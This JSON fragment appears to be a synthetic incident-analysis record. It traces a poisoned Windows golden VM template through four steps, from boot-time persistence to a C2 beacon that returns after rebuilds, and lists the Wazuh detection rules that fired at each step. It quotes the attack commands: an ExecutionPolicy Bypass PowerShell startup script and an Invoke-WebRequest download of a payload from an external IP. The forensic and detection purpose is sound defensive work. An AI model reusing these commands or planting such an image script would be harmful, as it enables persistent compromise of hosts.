  "attack_progression": [
    {"step": 1, "tactic": "Persistence / Implant Internal Image — Golden VM Template Poisoning", "technique": "T1525", "what_happened": "At 2027-04-08 14:25:11 CEST, host WIN-PRD-074 (agent.id=174, agent.ip=10.42.18.74) was provisioned from the corporate Windows-2019 golden VM template. The host had Windows event ID 6005 (event log service started — boot marker) at 14:22:23 CEST — i.e. it had been ALIVE for ~168 seconds when the first malicious activity fired. Sysmon EID 1 captured powershell.exe spawning with parentImage=C:\\Windows\\System32\\wininit.exe (i.e. the boot-time persistence runner, NOT user-driven) and commandLine='powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\init.ps1'. Sysmon EID 11 confirmed the file C:\\ProgramData\\init.ps1 was present BEFORE first boot (creation time matches the golden-image cutover, not first boot) — i.e. the script is BAKED INTO the image, not dropped post-provisioning. This is the textbook MITRE T1525 (Implant Internal Image) signature and the literal PDF playbook 060 artefact C ('Image-Embedded Script: Image=/templates/win2019-gold.vhdx, StartupScript=C:\\ProgramData\\init.ps1').", "chain_reason": "Wazuh rule 92150 'PowerShell auto-executed at boot from unsigned ProgramData script on freshly provisioned host (host_age<10min)' fired with rule.mitre.id=T1525+T1059.001 on agent.id=174 when Sysmon EID 1 + Windows EID 6005 timestamps were correlated (powershell.exe parent=wininit.exe + uptime<300s + script path under ProgramData not under Program Files).", "first_seen": "2027-04-08T14:25:11+0200"},
    {"step": 2, "tactic": "Command and Control / Application Layer Protocol — Initial Beacon", "technique": "T1071.001", "what_happened": "At 2027-04-08 14:26:44 CEST (≈93 seconds after init.ps1 launched — the deliberate Start-Sleep 90 in the script to avoid first-boot noise window), WIN-PRD-074's Sysmon EID 3 (Network Connect) recorded an outbound TLS connection: data.win.eventdata.image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, data.win.eventdata.destinationIp=92.118.39.84, data.win.eventdata.destinationPort=443, data.win.eventdata.user='NT AUTHORITY\\SYSTEM'. The PowerShell command line contained 'Invoke-WebRequest -Uri http://92.118.39.84/imp.bin -OutFile $env:ProgramData\\imp.bin'. The connection was made by SYSTEM (i.e. the init.ps1 ran in a privileged context), and the destination 92.118.39.84 is an external public IP not in our corporate egress allow-list. The file C:\\ProgramData\\imp.bin landed on disk 2 seconds later (Sysmon EID 11, sha256 captured).", "chain_reason": "Wazuh rule 92151 'PowerShell Invoke-WebRequest to external IP from SYSTEM context within 5min of boot' fired with rule.mitre.id=T1071.001+T1105 on agent.id=174 when Sysmon EID 3 destinationIp was external + parentProcess=powershell.exe (from step 1) + user=SYSTEM + Windows EID 6005 boot within 300s.", "first_seen": "2027-04-08T14:26:44+0200"},
    {"step": 3, "tactic": "Persistence — Population-Level Pattern (Multiple Newly Provisioned Hosts)", "technique": "T1525", "what_happened": "Between 14:25 and 15:12 CEST (≈47 minutes), TWO MORE newly provisioned hosts — WIN-PRD-075 (agent.id=175, host_age=191s when first malicious activity fired) and WIN-PRD-076 (agent.id=176, host_age=174s) — exhibited the EXACT SAME pattern: powershell.exe parent=wininit.exe runs C:\\ProgramData\\init.ps1, sleeps ~90s, then Invoke-WebRequest to the same external IP 92.118.39.84:443 from SYSTEM context. The hash of C:\\ProgramData\\init.ps1 is IDENTICAL across all three hosts (sha256=7af3e2b1c4d8f5a9...). All three were provisioned from the same source: the Windows-2019 golden VM template at \\\\corp-images\\templates\\win2019-gold.vhdx (vSphere provisioning log shows template UUID=525d8c4f-2027-04-golden). This is the population-shape signature of MITRE T1525 (Implant Internal Image) — every new build hits the same C2 IP within minutes of boot, with the SAME embedded artifact, hashed-identical across hosts. The OLDER production hosts in the same VLAN (host_age > 24h) show ZERO connections to 92.118.39.84 — the poisoning is in the image, not in the post-provisioning configuration management.", "chain_reason": "Wazuh correlation rule 92152 'Three or more newly provisioned hosts (uptime<10min) initiate outbound to the same external IP within a 1-hour window AND share identical ProgramData script hash' fired with rule.mitre.id=T1525. The correlation engine cross-referenced (a) Sysmon EID 1 powershell + wininit parent on three different agent.ids, (b) Sysmon EID 3 same destinationIp from each, (c) Sysmon EID 11 identical sha256 for C:\\ProgramData\\init.ps1 on each, (d) Windows EID 6005 boot timestamp within 5 minutes of each EID 1 event, (e) vSphere provisioning telemetry tagging all three as deployed from the same template UUID.", "first_seen": "2027-04-08T15:11:47+0200"},
    {"step": 4, "tactic": "Persistence / Reimage-Resistant Self-Reinfection", "technique": "T1525", "what_happened": "At 16:38:09 CEST, the IT-Ops team — alerted by the WIN-PRD-074 detection — destroyed and REPROVISIONED WIN-PRD-074 from the same golden image (vSphere event 'VM destroy' at 16:36:14 followed by 'VM clone from template win2019-gold' at 16:36:33). The rebuilt WIN-PRD-074 came online with Windows EID 6005 at 16:41:51 CEST. SEVEN MINUTES AND FORTY-TWO SECONDS LATER, at 16:45:33 CEST, the rebuilt host fired the IDENTICAL chain: Sysmon EID 1 powershell.exe parent=wininit.exe running C:\\ProgramData\\init.ps1, then Sysmon EID 3 outbound to 92.118.39.84:443 from SYSTEM. host_age at beacon = 222 seconds. This is the playbook PDF E ('RebuildIneffective=True') artifact materialised: reimaging from the SAME template does NOT clear the IOC because the template ITSELF is poisoned. Until the template is replaced, every rebuild reinfects.", "chain_reason": "Wazuh rule 92153 'Reinfection observed within 10min of rebuild — identical IOC after vSphere VM clone' fired with rule.mitre.id=T1525 on agent.id=174 when (a) a vSphere clone-from-template event preceded by <10min the appearance of (b) the exact same Sysmon EID 1+3 chain previously seen on the same agent.id, (c) with the same C2 destinationIp. The rule's purpose is precisely to detect template-level persistence by spotting that 'rebuild' does not equal 'clean'.", "first_seen": "2027-04-08T16:45:33+0200"}
